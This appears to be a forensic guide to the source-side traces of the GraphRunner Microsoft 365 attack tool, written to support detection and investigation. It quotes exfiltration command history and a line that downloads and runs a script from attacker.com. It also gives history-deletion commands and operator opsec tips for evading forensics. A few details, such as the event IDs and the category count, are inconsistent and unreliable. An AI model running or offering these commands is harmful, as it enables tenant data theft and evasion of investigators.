# GraphRunner — Source Evidence

## Overview

GraphRunner's source-side evidence (artifacts left on the **attacker's** machine / operator's workstation) falls into four categories:

1. **PowerShell command history** — scripts, modules, and function invocations recorded in PSReadline history and process event logs
2. **File artifacts** — dropped PowerShell script, exfiltrated data files (JSON, CSV, HTML), token cache files
3. **Network artifacts** — HTTPS connections to Microsoft Graph endpoints, login.microsoftonline.com token endpoints
4. **Process artifacts** — PowerShell process creation, child processes (file download utilities, compression tools if operator bundles data)
5. **Credentials & tokens** — cached access tokens, refresh tokens, or plain-text credentials in script variables/memory

## PowerShell Command History & Process Artifacts

### PSReadline History

Every PowerShell command executed by the operator is recorded in the **PSReadline history file**, located at:
- **Windows:** `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- **Linux/macOS:** `~/.local/share/powershell/PSReadLine/ConsoleHost_history.txt`

**Example History Lines:**

```
Import-Module .\GraphRunner.ps1
$headers = Get-GraphTokens -username "user@target.onmicrosoft.com"
Get-DumpAppsTenantInfo -headers $headers -outfile "C:\Exfil\AppsInventory.html"
Invoke-SearchSharePointAndOneDrive -query "password" -headers $headers -outfile "C:\Exfil\Files.json"
$messages = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages?`$top=1000" -Headers $headers
$messages.value | Export-Csv "C:\Exfil\Email.csv"
Invoke-SecurityGroupCloner -groupId "12345678-..." -headers $headers -groupName "Global Admins - Copy"
```

**Analysis Note:** The history file contains usernames (UPN), tenant IDs (if passed explicitly), and exfiltration paths. It does **not** contain passwords or tokens (which are typically supplied via variables or piped securely), but it reveals the operator's intent clearly.

### PowerShell Process Event Log (Event ID 400 / 403)

If PowerShell Script Block Logging (Event ID 4104) is enabled on the source machine, each PowerShell script/function invocation is logged:

- **Event ID 4103** (Executing Pipeline) — records individual PowerShell command steps
- **Event ID 4104** (Script Block) — records script blocks (functions, scripts, dynamically created code)

**Example Event 4104 Log Content:**

```
ScriptBlockText:
Import-Module .\GraphRunner.ps1
Get-GraphTokens -username "user@target.onmicrosoft.com" -tenantId "12345678-..."

ScriptBlockId: 1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d
EngineVersion: 5.1.19041.4355
```

**Detection:** This is a direct source-side signature of the attack; however, most user workstations do **not** have Script Block Logging enabled by default (off on non-SYSTEM users on Windows 10/11).

## Dropped Files & Local Artifacts

### PowerShell Script File

If the operator drops `GraphRunner.ps1` to the filesystem:

- **Path:** Anywhere on disk; common locations are:
  - `C:\Temp\GraphRunner.ps1`
  - `C:\Users\<user>\Downloads\GraphRunner.ps1`
  - `C:\Windows\Temp\GraphRunner.ps1` (if admin)
  - `%APPDATA%\GraphRunner.ps1`

**File Properties:**
- **Hash:** SHA256 of the original file from GitHub; changes only if the operator modifies it (unlikely)
- **Creation time:** Time of download/drop
- **Last Write time:** Time of last modification
- **Size:** ~3000 lines = ~100-150 KB

**Analysis:** The presence of `GraphRunner.ps1` on an endpoint is a strong indicator of Graph API attack preparation. The file is unsigned and will trigger code-signing checks or EDR heuristics if enabled.

### Exfiltrated Data Files

Any files exported by GraphRunner are left on disk:

| File | Typical Path | Contents |
|------|---|---|
| `AppsInventory.html` / `.csv` | `C:\Exfil\*` | Application IDs, redirect URIs, permissions |
| `Email.csv` / `.json` | `C:\Exfil\*` | Email messages, metadata, timestamps |
| `Teams_Full.json` | `C:\Exfil\*` | Teams chats, channel messages, attachments |
| `SensitiveFiles.json` | `C:\Exfil\*` | SharePoint/OneDrive file listings |
| `AdminUsers.csv` | `C:\Exfil\*` | User attributes, job titles, departments |
| `CondAccessPolicies.html` | `C:\Exfil\*` | Conditional Access policy definitions |

**Forensic Value:** These files are high-fidelity indicators of GraphRunner usage. Their presence, timestamps, and contents directly correlate to target-side Graph API audit log timestamps.

### Token Cache & Credential Files

#### Access Tokens (In-Memory)

GraphRunner's `$headers` variable contains the Bearer token in memory:

```powershell
$headers = @{"Authorization" = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."}
```

**Memory-Forensics Angle:** A memory dump of the PowerShell process (`powershell.exe`) could reveal the plaintext access token. This is a high-value artifact if the operator doesn't clean up.

#### Refresh Tokens

If the operator uses `Invoke-CAPSRefreshTokenAuth` or captures a refresh token:

```powershell
$refreshToken = "0.AXEAr..." # Stored in script variable or script file
```

Refresh tokens are typically 3000-4000 characters and can be found:
- **In-memory** (PowerShell process dump)
- **In files** (if operator saves the token to a file for reuse)
- **In browser DevTools** (if obtained via Device Code Flow with browser capture)

#### Compromised Credentials (If Used)

If the operator calls `Get-GraphTokens -username "user@target.com" -password $securePassword`:

- The password is **not** stored in PSReadline history (it's in a SecureString variable)
- However, if the operator types the password as a command-line argument or in a script file, it **will** be visible in:
  - PSReadline history
  - Event 4104 (Script Block Logging) if enabled
  - Memory dump of `powershell.exe`

**Best Practice (Operator Opsec):** Use `Get-GraphTokens` interactively (no `-password` argument) so the operator is prompted, and the password isn't stored anywhere except in the operator's memory.

## Network Artifacts

### HTTPS Traffic to Microsoft Graph and Azure AD

#### Graph API Calls

Any traffic to `https://graph.microsoft.com/` endpoints will appear in:

- **Proxy logs** (if an HTTP/HTTPS proxy is in use)
- **Firewall logs** (if full-content inspection is enabled)
- **Process-level network forensics** (e.g., Sysmon Event 3, network capture)
- **DNS logs** (query for `graph.microsoft.com` resolved)

**Example Captured Requests:**

```
POST https://graph.microsoft.com/v1.0/me/messages HTTP/1.1
Host: graph.microsoft.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
Content-Type: application/json

GET https://graph.microsoft.com/v1.0/oauth2PermissionGrants HTTP/1.1
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
```

**Operator-Side Detection:** On the operator's own network (corporate proxy, home network), these requests are visible. However, if the operator is operating from:
- A VPN to a different geography
- A residential proxy service
- A legitimate corporate network (making the requests look like normal user activity)

...the requests blend in.

#### Token Acquisition Endpoints

If the operator uses `Get-GraphTokens` with credentials, traffic to the token endpoint is captured:

```
POST https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=password&client_id=1b730954-1685-4b74-9bda-3b3b6a7366c9&username=user%40target.com&password=...&scope=...
```

This traffic is noisy (looks like legitimate user authentication) and doesn't inherently reveal an attack; however, the request body contains the username and grant_type, which, if captured, reveals the authentication method.

### DNS Resolution

DNS queries for `graph.microsoft.com` and `login.microsoftonline.com` are logged (if DNS logging is enabled):

- **Internal DNS logs** (if operator is on corporate network)
- **ISP DNS logs** (if operator is using ISP DNS)
- **External DNS logging services** (if operator is using a privacy-focused DNS service like Cloudflare)

**Note:** These resolutions are **extremely common** (legitimate cloud applications use the same endpoints), so they're not intrinsically suspicious unless correlated with:
- Unusual time-of-day (e.g., 3 AM)
- Volume (hundreds of requests in seconds)
- Correlation with other indicators (e.g., `Get-GraphTokens` in PSReadline history)

## Temporal Correlation to Target-Side Evidence

The **strongest forensic correlation** between source and target evidence is the **timestamp of GraphRunner commands on the source** vs. **timestamp of Graph API calls in the target's audit logs**.

### Timeline Building

1. **Source: PSReadline History + Event Logs**
   - `14:35:22` — `Import-Module .\GraphRunner.ps1`
   - `14:35:47` — `$headers = Get-GraphTokens -username "user@target.com"`
   - `14:36:05` — `Invoke-SearchSharePointAndOneDrive ...`
   - `14:36:30` — `Invoke-DumpAppsTenantInfo ...`

2. **Network: HTTP Proxy / Firewall Logs**
   - `14:35:47` — POST to `login.microsoftonline.com/.../token` (token acquisition)
   - `14:36:05` — GET/POST to `graph.microsoft.com/v1.0/me/drive/...` (file search)
   - `14:36:30` — GET to `graph.microsoft.com/v1.0/applications` (app enumeration)

3. **Target: Microsoft Graph API Audit Logs** (see **04 - Target Evidence.md** for details)
   - `14:35:50` — Sign-in event (token issued)
   - `14:36:06` — OneDrive/SharePoint activity logged
   - `14:36:31` — Application enumeration via Graph API

**Key Observation:** The timestamps are **usually aligned within seconds**, allowing an analyst to correlate source commands with target audit events and confirm the attack timeline.

## Memory-Forensics Angle

A memory dump of the `powershell.exe` process holding the GraphRunner session could reveal:

1. **Access Token** (plaintext, in-memory, usable for follow-up attacks)
2. **Refresh Token** (if captured and retained in memory)
3. **Variable Contents** (e.g., `$headers`, `$messages`, `$files`)
4. **Exfiltrated Data** (if large results are still in the PowerShell session before export)

**Mitigation (Operator Opsec):** Close the PowerShell session cleanly; use `Clear-Variable -Name * -Scope Global` to wipe session variables before exiting; consider running GraphRunner in a disposable VM that is discarded after the session.

## Edge Cases & Opsec Considerations

### Evasion: Running GraphRunner from Memory

```powershell
# No file on disk — script dot-sourced into PowerShell directly:
$content = (New-Object Net.WebClient).DownloadString("https://attacker.com/GraphRunner.ps1")
Invoke-Expression $content
```

**Source Evidence:** No `GraphRunner.ps1` file on disk, but PSReadline history still captures the `Invoke-Expression` command and subsequent function calls (if Script Block Logging is enabled). The download from `attacker.com` is visible in proxy logs.

### Evasion: Disabling PSReadline History

```powershell
# Before starting the session:
Set-PSReadLineKeyHandler -Key Tab -Function MenuComplete
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

**Effect:** Disables PSReadline history logging for that session. However:
- Event 4104 (Script Block Logging) still captures commands if it's enabled
- Shell history from the **terminal host** (e.g., Windows Terminal, VS Code) may still record commands
- Network traffic to Graph API is still logged by proxies/firewalls

### Evasion: Running on Another User's Account

If the operator obtains RDP access to another user's machine and runs GraphRunner there, the source artifacts (PSReadline history, temporary files, process logs) appear under that user's profile, not the initial compromised user's profile. This can complicate attribution.

---

## Summary of Strongest Source-Side Indicators

1. **PSReadline history file** — Commands visible in plain text; presence of GraphRunner function names
2. **File artifacts** — `.ps1` script file, `.json`/`.csv` export files in uncommon directories
3. **PowerShell Script Block Logging** (if enabled) — Event ID 4104 with full command content
4. **Network indicators** — HTTPS traffic to `graph.microsoft.com` + `login.microsoftonline.com` in proxy logs, correlated with timestamps
5. **Token/credential artifacts** — Plaintext or SecureString credentials in memory; refresh tokens in variable storage
6. **Temporal correlation** — Source command timestamps within seconds of target-side Graph API audit log timestamps
